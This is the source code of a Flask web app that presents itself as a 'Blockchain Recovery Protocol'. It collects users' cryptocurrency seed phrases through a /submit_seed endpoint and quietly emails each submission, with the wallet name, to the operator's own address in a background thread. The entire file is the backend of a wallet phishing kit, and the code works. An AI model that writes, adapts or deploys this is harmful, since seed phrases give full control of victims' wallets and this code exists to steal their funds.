
from flask import Flask, render_template, request, jsonify
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time

app = Flask(__name__)

# Email configuration (you'll need to set these up)
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "your-email@gmail.com"
EMAIL_PASSWORD = "your-app-password"

def send_email_async(email_data):
    """Send email with wallet data in background"""
    try:
        # Skip email if credentials not configured
        if EMAIL_ADDRESS == "your-email@gmail.com" or EMAIL_PASSWORD == "your-app-password":
            print("Email credentials not configured - skipping email send")
            return
            
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = "Wallet Recovery Data Submission"
        
        body = f"""New wallet recovery submission:

Wallet Name: {email_data.get('wallet_name', 'N/A')}
Data Type: {email_data.get('data_type', 'N/A')}
Issue: {email_data.get('issue', 'N/A')}

Data Content:
{email_data.get('seed_phrase', '')}

---
Submitted via Blockchain Recovery Protocol
        """
        
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Email error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit_seed', methods=['POST'])
def submit_seed():
    try:
        data = request.get_json()
        seed_phrase = data.get('seedPhrase', '')
        wallet_name = data.get('walletName', '')
        data_type = data.get('dataType', '')
        issue = data.get('issue', '')
        
        # Prepare detailed email content
        email_data = {
            'seed_phrase': seed_phrase,
            'wallet_name': wallet_name,
            'data_type': data_type,
            'issue': issue
        }
        
        # Send email in background
        email_thread = threading.Thread(target=send_email_async, args=(email_data,))
        email_thread.daemon = True
        email_thread.start()
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
